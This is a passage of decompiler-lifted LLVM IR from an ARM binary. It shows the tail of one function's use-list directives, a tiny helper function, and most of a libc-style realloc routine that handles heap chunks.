  uselistorder i32 %v2_12794, { 0, 2, 1, 3 }
  uselistorder i1 %v7_12788, { 1, 0 }
  uselistorder i32 %v0_12760, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 39, 40, 41, 43, 44, 45, 46, 108, 109, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 80, 88, 75, 76, 77, 78, 79, 81, 82, 83, 84, 0, 85, 86, 87, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_12ff8, { 1, 0 }
  uselistorder label %dec_label_pc_12fdc, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12fd8, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12fc8, { 1, 2, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_12f5c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12ed8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12ed0, { 1, 0 }
  uselistorder label %bb165, { 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread41, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12da4, { 1, 0 }
  uselistorder label %.thread33, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %dec_label_pc_12cd8, { 2, 0, 3, 1 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %bb149, { 1, 0 }
  uselistorder label %.thread28, { 1, 0 }
  uselistorder label %dec_label_pc_12b90, { 0, 2, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_12ae4, { 1, 0 }
  uselistorder label %dec_label_pc_12aec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12ab0, { 1, 0 }
  uselistorder label %dec_label_pc_12a64, { 1, 0 }
  uselistorder label %dec_label_pc_129f8, { 1, 0 }
  uselistorder label %dec_label_pc_129f4, { 1, 0 }
  uselistorder label %dec_label_pc_129a0, { 1, 0 }
  uselistorder label %dec_label_pc_1298c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12954, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12940, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
  uselistorder label %bb139, { 1, 0 }
}

define i32 @function_1300c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1300c:
  %v0_1300c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1300c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1300c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1300c, %bb
  %v10_13020 = phi i32 [ %arg1, %dec_label_pc_1300c ], [ 0, %bb ]
  ret i32 %v10_13020

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13024 = load i32, i32* @r4, align 4
  %v6_13024 = load i32, i32* @r5, align 4
  %v9_13024 = load i32, i32* @r6, align 4
  %v12_13024 = load i32, i32* @r7, align 4
  %v15_13024 = load i32, i32* @r8, align 4
  %v18_13024 = load i32, i32* @sb, align 4
  %v21_13024 = load i32, i32* @sl, align 4
  %v24_13024 = load i32, i32* @fp, align 4
  %v27_13024 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_13030 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13030, label %dec_label_pc_13044, label %dec_label_pc_13054

dec_label_pc_13044:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_13048 = call i32 @malloc(i32 %arg2)
  store i32 %v1_13048, i32* %r0.global-to-local, align 4
  store i32 %v1_13048, i32* @r4, align 4
  br label %dec_label_pc_133ac

dec_label_pc_13054:                               ; preds = %entry
  %v2_13054 = icmp eq i32 %arg2, 0
  br i1 %v2_13054, label %dec_label_pc_1305c, label %dec_label_pc_13068

dec_label_pc_1305c:                               ; preds = %dec_label_pc_13054
  %v0_1305c = call i32 @free()
  store i32 %v0_1305c, i32* %r0.global-to-local, align 4
  %v0_13060 = load i32, i32* @r6, align 4
  store i32 %v0_13060, i32* @r4, align 4
  br label %dec_label_pc_133ac

dec_label_pc_13068:                               ; preds = %dec_label_pc_13054
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_13070 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 72) to i32*), align 4
  store i32 %v4_13070, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_13070, i32* %r2.global-to-local, align 4
  %v4_1307c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_1307c, i32* %r1.global-to-local, align 4
  %v2_13080 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13080, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_13088 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13088)
  %v0_13094 = load i32, i32* @r4, align 4
  store i32 %v0_13094, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_130a0 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 16) to i32*), align 4
  store i32 %v4_130a0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_130ac.446 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_130a0)
  %v0_130ac = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_130ac, -32
  br i1 %tmp36, label %dec_label_pc_130c8, label %dec_label_pc_130b4

dec_label_pc_130b4:                               ; preds = %dec_label_pc_13068
  %v0_130b4 = call i32 @__GI___errno_location()
  store i32 %v0_130b4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_130c0 = inttoptr i32 %v0_130b4 to i32*
  store i32 12, i32* %v2_130c0, align 4
  br label %dec_label_pc_133ac

dec_label_pc_130c8:                               ; preds = %dec_label_pc_13068
  %v1_130c8 = add i32 %v0_130ac, 11
  store i32 %v1_130c8, i32* %r0.global-to-local, align 4
  %v0_130cc = load i32, i32* @r5, align 4
  %v1_130cc = add i32 %v0_130cc, -4
  %v2_130cc = inttoptr i32 %v1_130cc to i32*
  %v3_130cc = load i32, i32* %v2_130cc, align 4
  store i32 %v3_130cc, i32* %r2.global-to-local, align 4
  %v2_130d0 = icmp ugt i32 %v1_130c8, 14
  %v7_130d0 = icmp eq i32 %v1_130c8, 15
  %v2_130d4 = xor i1 %v2_130d0, true
  %v3_130d4 = or i1 %v7_130d0, %v2_130d4
  br i1 %v3_130d4, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_130c8
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_130c8, %bb
  %v2_130d8 = xor i1 %v7_130d0, true
  %v3_130d8 = and i1 %v2_130d0, %v2_130d8
  br i1 %v3_130d8, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_130d8 = and i32 %v1_130c8, -8
  store i32 %v5_130d8, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_130dc = and i32 %v3_130cc, 2
  %v2_130dc = icmp eq i32 %v1_130dc, 0
  %v1_130e0 = add i32 %v0_130cc, -8
  store i32 %v1_130e0, i32* @sl, align 4
  %v1_130e4 = and i32 %v3_130cc, -4
  store i32 %v1_130e4, i32* @r6, align 4
  br i1 %v2_130dc, label %dec_label_pc_130ec, label %dec_label_pc_132c4

dec_label_pc_130ec:                               ; preds = %bb29
  %v1_130ec = load i32, i32* @sb, align 4
  %v3_130ec = icmp ult i32 %v1_130e4, %v1_130ec
  br i1 %v3_130ec, label %dec_label_pc_130f8, label %bb30

bb30:                                             ; preds = %dec_label_pc_130ec
  store i32 %v1_130e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1325c

dec_label_pc_130f8:                               ; preds = %dec_label_pc_130ec
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_13100 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_13100, i32* %r0.global-to-local, align 4
  %v1_13104 = add i32 %v4_13100, 44
  %v2_13104 = inttoptr i32 %v1_13104 to i32*
  %v3_13104 = load i32, i32* %v2_13104, align 4
  store i32 %v3_13104, i32* %r3.global-to-local, align 4
  %v2_13108 = add i32 %v1_130e4, %v1_130e0
  store i32 %v2_13108, i32* @r4, align 4
  %v9_1310c = icmp eq i32 %v2_13108, %v3_13104
  %v1_13110 = add i32 %v2_13108, 4
  %v2_13110 = inttoptr i32 %v1_13110 to i32*
  %v3_13110 = load i32, i32* %v2_13110, align 4
  store i32 %v3_13110, i32* %r1.global-to-local, align 4
  br i1 %v9_1310c, label %dec_label_pc_13118, label %dec_label_pc_13154

dec_label_pc_13118:                               ; preds = %dec_label_pc_130f8
  %v1_13118 = and i32 %v3_13110, -4
  %v2_1311c = add i32 %v1_13118, %v1_130e4
  store i32 %v2_1311c, i32* %r1.global-to-local, align 4
  %v1_13120 = add i32 %v1_130ec, 16
  store i32 %v1_13120, i32* %r3.global-to-local, align 4
  %v3_13124 = icmp ult i32 %v2_1311c, %v1_13120
  br i1 %v3_13124, label %dec_label_pc_131a8, label %dec_label_pc_1312c

dec_label_pc_1312c:                               ; preds = %dec_label_pc_13118
  %v2_1312c = sub i32 %v2_1311c, %v1_130ec
  %v1_13130 = urem i32 %v3_130cc, 2
  %v2_13134 = add i32 %v1_130ec, %v1_130e0
  store i32 %v2_13134, i32* %r1.global-to-local, align 4
  %v2_13138 = or i32 %v1_130ec, %v1_13130
  store i32 %v2_13138, i32* %r2.global-to-local, align 4
  %v1_1313c = or i32 %v2_1312c, 1
  store i32 %v1_1313c, i32* %r3.global-to-local, align 4
  store i32 %v0_130cc, i32* @r4, align 4
  store i32 %v2_13138, i32* %v2_130cc, align 4
  %v0_13148 = load i32, i32* %r1.global-to-local, align 4
  %v1_13148 = load i32, i32* %r0.global-to-local, align 4
  %v2_13148 = add i32 %v1_13148, 44
  %v3_13148 = inttoptr i32 %v2_13148 to i32*
  store i32 %v0_13148, i32* %v3_13148, align 4
  %v0_1314c = load i32, i32* %r3.global-to-local, align 4
  %v1_1314c = load i32, i32* %r1.global-to-local, align 4
  %v2_1314c = add i32 %v1_1314c, 4
  %v3_1314c = inttoptr i32 %v2_1314c to i32*
  store i32 %v0_1314c, i32* %v3_1314c, align 4
  br label %dec_label_pc_13390

dec_label_pc_13154:                               ; preds = %dec_label_pc_130f8
  %v1_13154 = and i32 %v3_13110, -2
  %v2_13158 = add i32 %v1_13154, %v2_13108
  store i32 %v2_13158, i32* %r3.global-to-local, align 4
  %v1_1315c = add i32 %v2_13158, 4
  %v2_1315c = inttoptr i32 %v1_1315c to i32*
  %v3_1315c = load i32, i32* %v2_1315c, align 4
  store i32 %v3_1315c, i32* %r3.global-to-local, align 4
  %v1_13160 = urem i32 %v3_1315c, 2
  %v2_13160 = icmp eq i32 %v1_13160, 0
  br i1 %v2_13160, label %dec_label_pc_13168, label %dec_label_pc_131a8

dec_label_pc_13168:                               ; preds = %dec_label_pc_13154
  %v1_13168 = and i32 %v3_13110, -4
  store i32 %v1_13168, i32* %r3.global-to-local, align 4
  %v2_1316c = add i32 %v1_13168, %v1_130e4
  store i32 %v2_1316c, i32* %r0.global-to-local, align 4
  %v3_13170 = icmp ult i32 %v2_1316c, %v1_130ec
  br i1 %v3_13170, label %dec_label_pc_131a8, label %dec_label_pc_13178

dec_label_pc_13178:                               ; preds = %dec_label_pc_13168
  %v1_13178 = add i32 %v1_130e4, %v0_130cc
  %v2_13178 = inttoptr i32 %v1_13178 to i32*
  %v3_13178 = load i32, i32* %v2_13178, align 4
  store i32 %v3_13178, i32* %r1.global-to-local, align 4
  %v1_1317c = add i32 %v3_13178, 12
  %v2_1317c = inttoptr i32 %v1_1317c to i32*
  %v3_1317c = load i32, i32* %v2_1317c, align 4
  store i32 %v3_1317c, i32* %r3.global-to-local, align 4
  %v9_13180 = icmp eq i32 %v3_1317c, %v2_13108
  %v1_13184 = add i32 %v2_13108, 12
  %v2_13184 = inttoptr i32 %v1_13184 to i32*
  %v3_13184 = load i32, i32* %v2_13184, align 4
  store i32 %v3_13184, i32* %r2.global-to-local, align 4
  br i1 %v9_13180, label %dec_label_pc_1318c, label %dec_label_pc_13198

dec_label_pc_1318c:                               ; preds = %dec_label_pc_13178
  %v1_1318c = add i32 %v3_13184, 8
  %v2_1318c = inttoptr i32 %v1_1318c to i32*
  %v3_1318c = load i32, i32* %v2_1318c, align 4
  store i32 %v3_1318c, i32* %r3.global-to-local, align 4
  %v9_13190 = icmp eq i32 %v3_1318c, %v2_13108
  br i1 %v9_13190, label %dec_label_pc_1319c, label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %dec_label_pc_13178, %dec_label_pc_1318c
  %v0_13198 = call i32 @abort()
  store i32 %v0_13198, i32* %r0.global-to-local, align 4
  %v0_1319c.pre = load i32, i32* @r1, align 4
  %v1_1319c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1319c

dec_label_pc_1319c:                               ; preds = %dec_label_pc_1318c, %dec_label_pc_13198
  %v1_1319c = phi i32 [ %v3_13184, %dec_label_pc_1318c ], [ %v1_1319c.pre, %dec_label_pc_13198 ]
  %v0_1319c = phi i32 [ %v3_13178, %dec_label_pc_1318c ], [ %v0_1319c.pre, %dec_label_pc_13198 ]
  %v2_1319c = add i32 %v1_1319c, 8
  %v3_1319c = inttoptr i32 %v2_1319c to i32*
  store i32 %v0_1319c, i32* %v3_1319c, align 4
  %v0_131a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_131a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_131a0 = add i32 %v1_131a0, 12
  %v3_131a0 = inttoptr i32 %v2_131a0 to i32*
  store i32 %v0_131a0, i32* %v3_131a0, align 4
  %v1_1325c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1325c

dec_label_pc_131a8:                               ; preds = %dec_label_pc_13118, %dec_label_pc_13168, %dec_label_pc_13154
  %v1_131a8 = add i32 %v1_130ec, -7
  store i32 %v1_131a8, i32* %r0.global-to-local, align 4
  %v1_131ac = call i32 @malloc(i32 %v1_131a8)
  store i32 %v1_131ac, i32* @r0, align 4
  store i32 %v1_131ac, i32* %r1.global-to-local, align 4
  %v2_131b0 = icmp eq i32 %v1_131ac, 0
  br i1 %v2_131b0, label %bb31, label %dec_label_pc_131bc

bb31:                                             ; preds = %dec_label_pc_131a8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13390

dec_label_pc_131bc:                               ; preds = %dec_label_pc_131a8
  %v1_131c4.pre = load i32, i32* @r4, align 4
  %v1_131bc = add i32 %v1_131ac, -4
  %v2_131bc = inttoptr i32 %v1_131bc to i32*
  %v3_131bc = load i32, i32* %v2_131bc, align 4
  store i32 %v3_131bc, i32* @r3, align 4
  %v1_131c0 = add i32 %v1_131ac, -8
  store i32 %v1_131c0, i32* @r7, align 4
  %v9_131c4 = icmp eq i32 %v1_131c0, %v1_131c4.pre
  br i1 %v9_131c4, label %.thread2, label %dec_label_pc_131d4

.thread2:                                         ; preds = %dec_label_pc_131bc
  %v2_131c8 = and i32 %v3_131bc, -4
  store i32 %v2_131c8, i32* %r3.global-to-local, align 4
  %v2_131cc = load i32, i32* @r6, align 4
  %v3_131cc = add i32 %v2_131cc, %v2_131c8
  store i32 %v3_131cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1325c

dec_label_pc_131d4:                               ; preds = %dec_label_pc_131bc
  %v0_131d4 = load i32, i32* @r6, align 4
  %v1_131d4 = add i32 %v0_131d4, -4
  store i32 %v1_131d4, i32* @r2, align 4
  %v3_131d8 = udiv i32 %v1_131d4, 4
  store i32 %v3_131d8, i32* @ip, align 4
  %tmp37 = and i32 %v1_131d4, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_131e0 = icmp ult i32 %v1_131d4, 36
  %v3_131e0 = or i1 %tmp38, %v2_131e0
  %v0_131f0 = load i32, i32* @r5, align 4
  br i1 %v3_131e0, label %dec_label_pc_131f0, label %dec_label_pc_131e4

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131d4
  store i32 %v0_131f0, i32* @r1, align 4
  %v0_131e8 = call i32 @memcpy()
  store i32 %v0_131e8, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_131f0:                               ; preds = %dec_label_pc_131d4
  %v1_131f0 = inttoptr i32 %v0_131f0 to i32*
  %v2_131f0 = load i32, i32* %v1_131f0, align 4
  store i32 %v2_131f0, i32* %r3.global-to-local, align 4
  %v2_131f4 = inttoptr i32 %v1_131ac to i32*
  store i32 %v2_131f0, i32* %v2_131f4, align 4
  %v0_131f8 = load i32, i32* @r5, align 4
  %v1_131f8 = add i32 %v0_131f8, 4
  %v2_131f8 = inttoptr i32 %v1_131f8 to i32*
  %v3_131f8 = load i32, i32* %v2_131f8, align 4
  store i32 %v3_131f8, i32* %r3.global-to-local, align 4
  %v1_131fc = load i32, i32* %r1.global-to-local, align 4
  %v2_131fc = add i32 %v1_131fc, 4
  %v3_131fc = inttoptr i32 %v2_131fc to i32*
  store i32 %v3_131f8, i32* %v3_131fc, align 4
  %v0_13200 = load i32, i32* @r5, align 4
  %v1_13200 = add i32 %v0_13200, 8
  %v2_13200 = inttoptr i32 %v1_13200 to i32*
  %v3_13200 = load i32, i32* %v2_13200, align 4
  store i32 %v3_13200, i32* %r3.global-to-local, align 4
  %v0_13204 = load i32, i32* @ip, align 4
  %v1_13208 = load i32, i32* %r1.global-to-local, align 4
  %v2_13208 = add i32 %v1_13208, 8
  %v3_13208 = inttoptr i32 %v2_13208 to i32*
  store i32 %v3_13200, i32* %v3_13208, align 4
  %tmp39 = icmp ult i32 %v0_13204, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_13210

dec_label_pc_13210:                               ; preds = %dec_label_pc_131f0
  %v0_13210 = load i32, i32* @r5, align 4
  %v1_13210 = add i32 %v0_13210, 12
  %v2_13210 = inttoptr i32 %v1_13210 to i32*
  %v3_13210 = load i32, i32* %v2_13210, align 4
  store i32 %v3_13210, i32* %r3.global-to-local, align 4
  %v1_13214 = load i32, i32* %r1.global-to-local, align 4
  %v2_13214 = add i32 %v1_13214, 12
  %v3_13214 = inttoptr i32 %v2_13214 to i32*
  store i32 %v3_13210, i32* %v3_13214, align 4
  %v0_13218 = load i32, i32* @r5, align 4
  %v1_13218 = add i32 %v0_13218, 16
  %v2_13218 = inttoptr i32 %v1_13218 to i32*
  %v3_13218 = load i32, i32* %v2_13218, align 4
  store i32 %v3_13218, i32* %r3.global-to-local, align 4
  %v0_1321c = load i32, i32* @ip, align 4
  %v1_13220 = load i32, i32* %r1.global-to-local, align 4
  %v2_13220 = add i32 %v1_13220, 16
  %v3_13220 = inttoptr i32 %v2_13220 to i32*
  store i32 %v3_13218, i32* %v3_13220, align 4
  %tmp40 = icmp ult i32 %v0_1321c, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_13228

dec_label_pc_13228:                               ; preds = %dec_label_pc_13210
  %v0_13228 = load i32, i32* @r5, align 4
  %v1_13228 = add i32 %v0_13228, 20
  %v2_13228 = inttoptr i32 %v1_13228 to i32*
  %v3_13228 = load i32, i32* %v2_13228, align 4
  store i32 %v3_13228, i32* %r3.global-to-local, align 4
  %v1_1322c = load i32, i32* %r1.global-to-local, align 4
  %v2_1322c = add i32 %v1_1322c, 20
  %v3_1322c = inttoptr i32 %v2_1322c to i32*
  store i32 %v3_13228, i32* %v3_1322c, align 4
  %v0_13230 = load i32, i32* @r5, align 4
  %v1_13230 = add i32 %v0_13230, 24
  %v2_13230 = inttoptr i32 %v1_13230 to i32*
  %v3_13230 = load i32, i32* %v2_13230, align 4
  store i32 %v3_13230, i32* %r3.global-to-local, align 4
  %v1_13234 = load i32, i32* %r1.global-to-local, align 4
  %v2_13234 = add i32 %v1_13234, 24
  %v3_13234 = inttoptr i32 %v2_13234 to i32*
  store i32 %v3_13230, i32* %v3_13234, align 4
  %v0_13238 = load i32, i32* @ip, align 4
  %v7_13238 = icmp eq i32 %v0_13238, 9
  br i1 %v7_13238, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_13228
  %v1_1323c = load i32, i32* @r5, align 4
  %v2_1323c = add i32 %v1_1323c, 28
  %v3_1323c = inttoptr i32 %v2_1323c to i32*
  %v4_1323c = load i32, i32* %v3_1323c, align 4
  store i32 %v4_1323c, i32* %r3.global-to-local, align 4
  %v2_13240 = load i32, i32* %r1.global-to-local, align 4
  %v3_13240 = add i32 %v2_13240, 28
  %v4_13240 = inttoptr i32 %v3_13240 to i32*
  store i32 %v4_1323c, i32* %v4_13240, align 4
  %v1_13244 = load i32, i32* @r5, align 4
  %v2_13244 = add i32 %v1_13244, 32
  %v3_13244 = inttoptr i32 %v2_13244 to i32*
  %v4_13244 = load i32, i32* %v3_13244, align 4
  store i32 %v4_13244, i32* %r3.global-to-local, align 4
  %v2_13248 = load i32, i32* %r1.global-to-local, align 4
  %v3_13248 = add i32 %v2_13248, 32
  %v4_13248 = inttoptr i32 %v3_13248 to i32*
  store i32 %v4_13244, i32* %v4_13248, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13228, %dec_label_pc_13210, %dec_label_pc_131f0, %dec_label_pc_131e4, %bb32
  %v0_1324c = load i32, i32* @r5, align 4
  store i32 %v0_1324c, i32* @r0, align 4
  %v0_13250 = call i32 @free()
  store i32 %v0_13250, i32* %r0.global-to-local, align 4
  %v0_13254 = load i32, i32* @r7, align 4
  %v1_13254 = add i32 %v0_13254, 8
  store i32 %v1_13254, i32* @r4, align 4
  br label %dec_label_pc_13390

dec_label_pc_1325c:                               ; preds = %bb30, %.thread2, %dec_label_pc_1319c
  %v0_13270 = phi i32 [ %v3_131cc, %.thread2 ], [ %v1_130e4, %bb30 ], [ %v1_1325c.pre, %dec_label_pc_1319c ]
  %v0_1325c = load i32, i32* @sb, align 4
  %v2_1325c = sub i32 %v0_13270, %v0_1325c
  store i32 %v2_1325c, i32* %r1.global-to-local, align 4
  %v0_13264 = load i32, i32* @sl, align 4
  %v1_13264 = add i32 %v0_13264, 4
  %v2_13264 = inttoptr i32 %v1_13264 to i32*
  %v3_13264 = load i32, i32* %v2_13264, align 4
  %tmp41 = icmp ugt i32 %v2_1325c, 15
  %v1_1328c = urem i32 %v3_13264, 2
  store i32 %v1_1328c, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_1328c, label %dec_label_pc_1326c

dec_label_pc_1326c:                               ; preds = %dec_label_pc_1325c
  %v2_13270 = or i32 %v1_1328c, %v0_13270
  store i32 %v2_13270, i32* %r3.global-to-local, align 4
  store i32 %v2_13270, i32* %v2_13264, align 4
  %v0_13278 = load i32, i32* @sl, align 4
  %v1_13278 = load i32, i32* %r0.global-to-local, align 4
  %v2_13278 = add i32 %v1_13278, %v0_13278
  store i32 %v2_13278, i32* %r2.global-to-local, align 4
  %v1_1327c = add i32 %v2_13278, 4
  %v2_1327c = inttoptr i32 %v1_1327c to i32*
  %v3_1327c = load i32, i32* %v2_1327c, align 4
  %v1_13280 = or i32 %v3_1327c, 1
  store i32 %v1_13280, i32* %r3.global-to-local, align 4
  store i32 %v1_13280, i32* %v2_1327c, align 4
  br label %dec_label_pc_132bc

dec_label_pc_1328c:                               ; preds = %dec_label_pc_1325c
  %v2_13290 = add i32 %v0_13264, %v0_1325c
  store i32 %v2_13290, i32* %r0.global-to-local, align 4
  %v2_13294 = or i32 %v1_1328c, %v0_1325c
  store i32 %v2_13294, i32* %r3.global-to-local, align 4
  %v1_13298 = or i32 %v2_1325c, 1
  store i32 %v1_13298, i32* %r2.global-to-local, align 4
  store i32 %v2_13294, i32* %v2_13264, align 4
  %v0_132a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_132a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_132a0 = add i32 %v1_132a0, 4
  %v3_132a0 = inttoptr i32 %v2_132a0 to i32*
  store i32 %v0_132a0, i32* %v3_132a0, align 4
  %v0_132a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_132a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_132a4 = add i32 %v1_132a4, %v0_132a4
  store i32 %v2_132a4, i32* %r2.global-to-local, align 4
  %v1_132a8 = add i32 %v2_132a4, 4
  %v2_132a8 = inttoptr i32 %v1_132a8 to i32*
  %v3_132a8 = load i32, i32* %v2_132a8, align 4
  %v1_132ac = or i32 %v3_132a8, 1
  store i32 %v1_132ac, i32* %r3.global-to-local, align 4
  store i32 %v1_132ac, i32* %v2_132a8, align 4
  %v0_132b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_132b4 = add i32 %v0_132b4, 8
  store i32 %v1_132b4, i32* @r0, align 4
  %v0_132b8 = call i32 @free()
  store i32 %v0_132b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_132bc

dec_label_pc_132bc:                               ; preds = %dec_label_pc_1326c, %dec_label_pc_1328c
  %v0_132bc = load i32, i32* @sl, align 4
  %v1_132bc = add i32 %v0_132bc, 8
  store i32 %v1_132bc, i32* @r4, align 4
  br label %dec_label_pc_13390

dec_label_pc_132c4:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_132cc = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_132cc, i32* @r8, align 4
  %v2_132d0 = inttoptr i32 %v1_130e0 to i32*
  %v3_132d0 = load i32, i32* %v2_132d0, align 4
  store i32 %v3_132d0, i32* @r4, align 4
  %v1_132d4 = add i32 %v4_132cc, 860
  %v2_132d4 = inttoptr i32 %v1_132d4 to i32*
  %v3_132d4 = load i32, i32* %v2_132d4, align 4
  %v1_132d8 = add i32 %v3_132d0, 4
  %v1_132dc = add i32 %v3_132d4, -1
  store i32 %v1_132dc, i32* %r2.global-to-local, align 4
